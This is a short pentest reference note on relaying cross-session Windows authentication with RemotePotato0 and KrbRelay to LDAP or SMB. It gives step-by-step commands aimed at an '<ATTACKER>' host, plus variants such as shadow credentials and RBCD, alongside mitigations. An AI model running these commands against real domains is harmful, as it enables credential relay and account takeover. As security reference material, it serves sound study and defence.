---
topic: Relay cross-session con RemotePotato0
tags: [windows, active-directory, relay, remote-potato0, krbrelay]
---

# Relay cross-session con RemotePotato0

**English** | [🇪🇸 Español](remote-potato0-relay.md)

## Concept

RemotePotato0 forces an interactive session to authenticate to an attacker-controlled server through COM/RPC activation. The resulting hash or ticket is relayed to LDAP or SMB to gain access in another user's context.

## When it applies

- Windows host with interactive administrator sessions.
- Reachable RPC/COM service and relay allowed.
- LDAP without signing or SMB without signing.

## Procedure

1. Confirm active sessions and local privilege.
2. Start the relay listener and activation server.
3. Run RemotePotato0 against the target session.
4. Use the captured ticket/hash with `KrbRelay` or `ntlmrelayx`.

```bash
query user
RemotePotato0.exe -r <ATTACKER> -s <SESSION>
KrbRelay.exe -spn ldap/<DC> -clsid <CLSID> -rbcd <TARGET>
# Or NTLM relay to LDAP/SMB with ntlmrelayx
```

## Variants

- Relay to LDAP to create shadow credentials.
- Relay to SMB for RBCD.
- Coercion with PetitPotam/PrinterBug as an alternative.
- Service sessions instead of interactive ones.

## Limitations

- Requires an interactive session and local privileges.
- LDAP signing or SMB signing blocks the relay.
- Windows patches may prevent activation.

## Mitigation and detection

- Enable LDAP/SMB signing and channel binding.
- Limit interactive administrator sessions on servers.
- Monitor COM/RPC activation and relayed authentications.

## References

- <https://github.com/antonioCoco/RemotePotato0>
- <https://github.com/cube0x0/KrbRelay>
- <https://learn.microsoft.com/en-us/defender-for-identity/compromised-credentials-alerts>
